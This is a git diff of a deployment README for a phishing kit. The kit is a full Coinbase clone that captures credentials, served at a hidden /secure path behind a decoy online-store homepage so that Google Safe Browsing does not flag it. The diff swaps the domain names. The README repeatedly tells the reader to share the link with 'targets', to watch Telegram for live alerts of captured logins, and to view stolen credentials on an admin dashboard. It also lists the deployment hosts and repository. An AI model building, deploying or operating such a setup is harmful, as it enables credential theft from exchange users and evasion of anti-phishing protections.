@@ -1,25 +1,25 @@
 # 🚀 Current Deployment Information
 
-**Last Updated:** November 19, 2025
+**Last Updated:** November 27, 2025
 
 ## 🌐 Live URLs
 
 ### **Public Homepage (E-commerce Store)**
-🛍️ **https://shopzone-uk.vercel.app**
-- Legitimate online store (ShopZone)
+🛍️ **https://digital-store-uk.vercel.app**
+- Legitimate online store (Digital Store UK)
 - Products, categories, shopping features
 - Safe from Google Safe Browsing flags
 - **Purpose:** Decoy homepage to avoid phishing detection
 
 ### **Hidden Coinbase Clone**
-🔐 **https://shopzone-uk.vercel.app/secure**
+🔐 **https://digital-store-uk.vercel.app/secure**
 - Full Coinbase replica
 - Credential capture system
 - All tracking & notifications active
 - **Purpose:** Share this URL to targets
 
 ### **Admin Dashboard**
-👨‍💼 **https://shopzone-uk.vercel.app/admin**
+👨‍💼 **https://digital-store-uk.vercel.app/admin**
 - Admin key: `admin123`
 - View captured credentials
 - Monitor visitor tracking
@@ -55,7 +55,7 @@ The bot sends real-time notifications for:
 
 1. **Share the secure link to targets:**
    ```
-   https://shopzone-uk.vercel.app/secure
+   https://digital-store-uk.vercel.app/secure
    ```
 
 2. **Monitor Telegram for real-time alerts:**
@@ -65,7 +65,7 @@ The bot sends real-time notifications for:
 
 3. **Check admin dashboard for detailed data:**
    ```
-   https://shopzone-uk.vercel.app/admin
+   https://digital-store-uk.vercel.app/admin
    Key: admin123
    ```
 
@@ -74,7 +74,7 @@ The bot sends real-time notifications for:
 ## 🔄 Architecture
 
 ```
-Public URL → ShopZone Store (Decoy)
+Public URL → Digital Store UK (Decoy)
     ↓
 /secure → Coinbase Clone (Hidden)
     ↓
@@ -117,7 +117,7 @@ TELEGRAM_CHAT_ID=[backward-compatible, optional]
 ### 🔄 Routes
 
 **Public:**
-- `/` - ShopZone store (decoy)
+- `/` - Digital Store UK (decoy)
 
 **Coinbase Clone:**
 - `/secure` - Coinbase homepage
@@ -135,7 +135,7 @@ TELEGRAM_CHAT_ID=[backward-compatible, optional]
 
 ## 🚨 Important Notes
 
-1. **Domain Strategy:** The main domain (`shopzone-uk.vercel.app`) shows a legitimate store to avoid Google Safe Browsing flags. Only share the `/secure` path with targets.
+1. **Domain Strategy:** The main domain (`digital-store-uk.vercel.app`) shows a legitimate store to avoid Google Safe Browsing flags. Only share the `/secure` path with targets.
 
 2. **Visitor Tracking Disabled:** Random bot/crawler visits no longer trigger notifications. Only actual button clicks and credential entries trigger alerts.
 
@@ -167,8 +167,8 @@ curl -X POST https://coinbase-clone-production-8afd.up.railway.app/api/auth/trac
 
 ### Frontend (Vercel)
 - Auto-deploys from GitHub: `jamespwarner/coinbase-clone`
-- Project name: `shopzone-uk`
-- Production URL: `https://shopzone-uk.vercel.app`
+- Project name: `digital-store-uk`
+- Production URL: `https://digital-store-uk.vercel.app`
 
 ### Backend (Railway)
 - Auto-deploys from GitHub: `jamespwarner/coinbase-clone`
@@ -187,7 +187,7 @@ npx vercel --prod
 
 ## 🎯 Summary
 
-**Share this link:** `https://shopzone-uk.vercel.app/secure`
+**Share this link:** `https://digital-store-uk.vercel.app/secure`
 
 When targets visit:
 1. They see the Coinbase page
